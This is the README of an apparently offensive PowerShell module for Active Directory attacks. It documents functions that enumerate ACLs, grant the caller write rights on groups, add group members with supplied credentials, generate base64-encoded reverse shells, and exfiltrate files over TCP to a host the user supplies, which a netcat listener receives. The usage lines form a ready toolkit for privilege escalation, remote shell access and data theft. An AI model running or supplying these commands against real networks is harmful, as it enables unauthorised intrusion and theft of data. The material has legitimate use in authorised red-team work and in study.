# PSHelpers.psm1

PowerShell module for Active Directory enumeration, ACL inspection and post-exploitation utilities.

## Quick Reference

| Function | Category | Purpose |
|----------|----------|---------|
| [Get-ADComputerAcl](#get-adcomputeracl) | AD Enumeration | Inspect computer object permissions |
| [Get-ADGroupAcl](#get-adgroupacl) | AD Enumeration | Inspect group object permissions |
| [Get-ADComputerProperty](#get-adcomputerproperty) | AD Enumeration | Retrieve specific computer attributes |
| [Resolve-AceObjectGuid](#resolve-aceobjectguid) | AD Utilities | Convert GUIDs to human-readable names |
| [Add-NewADGroupMember](#add-newadgroupmember) | AD Modification | Add users to groups with credentials |
| [Grant-ADGroupAttributeWritePermission](#grant-adgroupattributewritepermission) | AD Modification | Grant self write access to group attributes |
| [New-RevShellBase64](#new-revshellbase64) | Post-Exploitation | Generate base64-encoded reverse shells |
| [Send-FileTcp](#send-filetcp) | Post-Exploitation | Exfiltrate files over TCP |

## Usage Examples

```powershell
# Import the module
Import-Module .\PSHelpers.psm1

# Verify functions are available
Get-Command -Module PSHelpers
```

## AD Enumeration

### Get-ADComputerAcl

Inspect Access Control Lists on computer objects to identify misconfigurations or excessive permissions.

```powershell
Get-ADComputerAcl -Identity <COMPUTER_NAME>
```

### Get-ADGroupAcl

Enumerate permissions on Active Directory groups, useful for identifying groups where you have modification rights.

```powershell
Get-ADGroupAcl -Identity <GROUP_NAME>
```

### Get-ADComputerProperty

Retrieve specific properties from computer objects using explicit credentials.

```powershell
Get-ADComputerProperty -User <DOMAIN>\<USERNAME> -Password <PASSWORD> -Computer <COMPUTER_NAME> -Property <PROPERTY>
```

## AD Utilities

### Resolve-AceObjectGuid

Translate GUIDs found in ACL entries to human-readable attribute or extended right names.

```powershell
Resolve-AceObjectGuid -ObjectGuid <GUID>
```

## AD Modification

### Add-NewADGroupMember

Add users to Active Directory groups using explicit credentials.

```powershell
Add-NewADGroupMember -Group <GROUP_NAME> -User <DOMAIN>\<USERNAME> -Password <PASSWORD> -NewMember <MEMBER_USERNAME>
```

### Grant-ADGroupAttributeWritePermission

Grant yourself write access to a specific group attribute (useful for Resource-Based Constrained Delegation or attribute takeover).

```powershell
Grant-ADGroupAttributeWritePermission -Group <GROUP_NAME> -User <DOMAIN>\<USERNAME> -Password <PASSWORD> -Guid <GUID>
```

## Post Exploitation

### New-RevShellBase64

Generate base64-encoded PowerShell reverse shell.

```powershell
# -Port is optional, default is 9001
New-RevShellBase64 -Ip <IP> -Port <PORT>
```

### Send-FileTcp

Exfiltrate files over TCP when standard file transfer methods are blocked.

```powershell
# Send file to listener
# -Port is optional, default is 9001
Send-FileTcp -Ip <IP> -Port <PORT> -Filepath <FILEPATH>

# On receiving end: nc -lvnp <PORT> > <OUT_FILE_NAME>
```